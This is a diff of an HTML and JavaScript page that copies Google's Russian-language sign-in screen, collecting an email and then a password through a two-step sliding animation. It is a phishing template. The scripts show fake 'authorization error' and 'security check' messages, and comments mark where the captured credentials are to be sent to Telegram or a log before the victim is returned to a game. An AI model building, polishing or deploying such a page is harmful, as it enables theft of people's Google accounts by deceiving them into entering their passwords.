@@ -6,12 +6,7 @@
     <title>Вход — Google Аккаунты</title>
     <link href="fonts.googleapis.com" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Roboto', arial, sans-serif;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }
 
         body {
             background-color: #fff;
@@ -19,46 +14,46 @@
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            color: #202124;
+            overflow: hidden;
         }
 
-        .login-box {
+        .container {
             width: 100%;
             max-width: 450px;
-            padding: 48px 40px 36px;
+            min-height: 500px;
+            padding: 48px 40px;
             border: 1px solid #dadce0;
             border-radius: 8px;
-            text-align: center;
+            position: relative;
+            overflow: hidden; /* Важно для анимации сдвига */
+            transition: height 0.3s ease;
         }
 
         @media (max-width: 450px) {
-            .login-box {
-                border: none;
-                padding: 24px 24px;
-            }
+            .container { border: none; padding: 24px; min-height: auto; }
         }
 
-        .google-logo {
-            width: 75px;
-            margin-bottom: 10px;
+        .step-wrapper {
+            display: flex;
+            width: 200%; /* Контейнер для двух шагов в ряд */
+            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        h1 {
-            font-size: 24px;
-            font-weight: 400;
-            margin-bottom: 8px;
+        .step {
+            width: 50%; /* Каждый шаг занимает ровно ширину родителя */
+            transition: opacity 0.3s;
         }
 
-        .subtitle {
-            font-size: 16px;
-            margin-bottom: 30px;
-        }
+        .logo-container { text-align: center; margin-bottom: 12px; }
+        .google-logo { width: 75px; }
+
+        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; color: #202124; }
+        .subtitle { font-size: 16px; text-align: center; margin-bottom: 32px; color: #202124; }
 
         /* Поля ввода */
-        .input-group {
+        .input-box {
             position: relative;
-            margin-bottom: 25px;
-            text-align: left;
+            margin-bottom: 24px;
         }
 
         input {
@@ -68,145 +63,168 @@
             border: 1px solid #dadce0;
             border-radius: 4px;
             outline: none;
-            transition: border 0.2s;
+            color: #202124;
         }
 
-        input:focus {
-            border: 2px solid #1a73e8;
-            padding: 12px 14px; /* компенсируем толщину рамки */
-        }
+        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
 
         .forgot-link {
             color: #1a73e8;
+            font-size: 14px;
             font-weight: 500;
             text-decoration: none;
-            font-size: 14px;
             display: inline-block;
-            margin-top: 9px;
-        }
-
-        .info-text {
-            color: #5f6368;
-            font-size: 14px;
-            line-height: 1.4;
-            margin-top: 40px;
-            text-align: left;
+            margin-bottom: 40px;
         }
 
         /* Кнопки */
-        .buttons {
+        .actions {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-top: 40px;
         }
 
-        .create-account {
-            color: #1a73e8;
-            font-weight: 500;
-            text-decoration: none;
-            font-size: 14px;
-        }
-
-        .btn-next {
-            background-color: #1a73e8;
+        .btn-text { color: #1a73e8; font-weight: 500; text-decoration: none; font-size: 14px; cursor: pointer; }
+        .btn-primary {
+            background: #1a73e8;
             color: #fff;
             border: none;
             padding: 10px 24px;
             border-radius: 4px;
             font-weight: 500;
+            cursor: pointer;
+        }
+
+        /* Стили для Шага 2 (Пароль) */
+        .user-pill {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 0 auto 24px;
+            padding: 4px 12px;
+            border: 1px solid #dadce0;
+            border-radius: 16px;
+            width: fit-content;
+            font-size: 14px;
+        }
+
+        .user-icon {
+            width: 20px;
+            height: 20px;
+            background: #5f6368;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .show-pass-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
             font-size: 14px;
             cursor: pointer;
-            transition: background 0.2s;
+            margin-top: 8px;
         }
 
-        .btn-next:hover {
-            background-color: #1765cc;
-            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
-        }
-
-        /* Скрытый блок пароля */
-        #password-step {
-            display: none;
-        }
-
-        .user-identity {
-            display: inline-flex;
-            align-items: center;
-            padding: 5px 10px;
-            border: 1px solid #dadce0;
-            border-radius: 20px;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
+        /* Состояния анимации */
+        .slide-active { transform: translateX(-50%); }
     </style>
 </head>
 <body>
 
-    <div class="login-box">
-        <img src="upload.wikimedia.org" alt="Google" class="google-logo">
-        
-        <!-- ШАГ 1: ПОЧТА -->
-        <div id="email-step">
-            <h1>Вход</h1>
-            <p class="subtitle">Используйте аккаунт Google</p>
-            
-            <div class="input-group">
-                <input type="email" id="email" placeholder="Телефон или адрес эл. почты" required>
-                <a href="#" class="forgot-link">Забыли адрес эл. почты?</a>
-            </div>
-
-            <p class="info-text">
-                Работаете на чужом компьютере? Используйте режим инкогнито, чтобы войти в аккаунт. 
-                <a href="#" style="color: #1a73e8; text-decoration: none;">Подробнее…</a>
-            </p>
-
-            <div class="buttons">
-                <a href="#" class="create-account">Создать аккаунт</a>
-                <button class="btn-next" onclick="nextStep()">Далее</button>
-            </div>
+    <div class="container">
+        <div class="logo-container">
+            <img src="upload.wikimedia.org" class="google-logo" alt="Google">
         </div>
 
-        <!-- ШАГ 2: ПАРОЛЬ (Скрыт изначально) -->
-        <div id="password-step">
-            <h1>Добро пожаловать!</h1>
-            email@gmail.com</div>
+        <div class="step-wrapper" id="wrapper">
             
-            <div class="input-group">
-                <input type="password" id="password" placeholder="Введите пароль" required>
-                <div style="margin-top: 10px; text-align: left;">
-                    <input type="checkbox" id="show-pass" style="width: auto;"> 
-                    <label for="show-pass" style="font-size: 14px; cursor: pointer;">Показать пароль</label>
+            <!-- ШАГ 1: ПОЧТА -->
+            <div class="step" id="step1">
+                <h1>Вход</h1>
+                <p class="subtitle">Используйте аккаунт Google</p>
+                
+                <div class="input-box">
+                    <input type="email" id="email" placeholder="Телефон или адрес эл. почты" autocomplete="username">
+                </div>
+
+                <a href="#" class="btn-text">Забыли адрес эл. почты?</a>
+
+                <div style="margin-top: 40px; font-size: 14px; color: #5f6368; line-height: 1.4; margin-bottom: 40px;">
+                    Работаете на чужом компьютере? Используйте режим инкогнито. <a href="#" style="color:#1a73e8; text-decoration:none;">Подробнее…</a>
+                </div>
+
+                <div class="actions">
+                    <span class="btn-text">Создать аккаунт</span>
+                    <button class="btn-primary" onclick="goToPassword()">Далее</button>
                 </div>
             </div>
 
-            <div class="buttons" style="justify-content: flex-end;">
-                <button class="btn-next" onclick="finishLogin()">Подтвердить</button>
+            <!-- ШАГ 2: ПАРОЛЬ -->
+            <div class="step" id="step2">
+                <h1>Добро пожаловать!</h1>
+                <div class="user-pill">
+                    <div class="user-icon">
+                        <svg viewBox="0 0 24 24" fill="#fff" width="14" height="14"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+                    </div>
+                    <span id="display-email"></span>
+                </div>
+                
+                <div class="input-box">
+                    <input type="password" id="password" placeholder="Введите пароль">
+                    <label class="show-pass-label">
+                        <input type="checkbox" style="width:18px; height:18px;" onclick="togglePass()"> Показать пароль
+                    </label>
+                </div>
+
+                <div class="actions" style="justify-content: flex-end; margin-top: 48px;">
+                    <button class="btn-primary" onclick="submitFinal()">Далее</button>
+                </div>
             </div>
+
         </div>
     </div>
 
     <script>
-        function nextStep() {
-            const email = document.getElementById('email').value;
-            if (email.length > 5) {
-                document.getElementById('email-step').style.display = 'none';
-                document.getElementById('password-step').style.display = 'block';
-                document.getElementById('display-email').innerText = email;
-            } else {
-                alert('Введите корректный email');
+        function goToPassword() {
+            const emailValue = document.getElementById('email').value;
+            
+            if (emailValue.trim() === "") {
+                alert("Введите адрес электронной почты");
+                return;
             }
+
+            // Записываем email во второй шаг
+            document.getElementById('display-email').innerText = emailValue;
+
+            // Анимация сдвига влево
+            document.getElementById('wrapper').classList.add('slide-active');
+            
+            // Фокус на поле пароля после анимации
+            setTimeout(() => {
+                document.getElementById('password').focus();
+            }, 400);
         }
 
-        function finishLogin() {
+        function togglePass() {
+            const p = document.getElementById('password');
+            p.type = p.type === "password" ? "text" : "password";
+        }
+
+        function submitFinal() {
             const pass = document.getElementById('password').value;
-            if (pass.length > 3) {
-                // Здесь можно добавить отправку данных в телеграм или лог
-                alert('Ошибка авторизации. Попробуйте позже.');
-                window.location.href = "index.html"; // Возврат на главную
-            } else {
-                alert('Введите пароль');
+            if (pass.length < 4) {
+                alert("Введите пароль");
+                return;
             }
+
+            // Эмуляция загрузки
+            alert("Проверка безопасности... Пожалуйста, подождите.");
+            
+            // Здесь можно отправить данные и вернуть пользователя в игру
+            window.location.href = "index.html"; 
         }
     </script>
 </body>
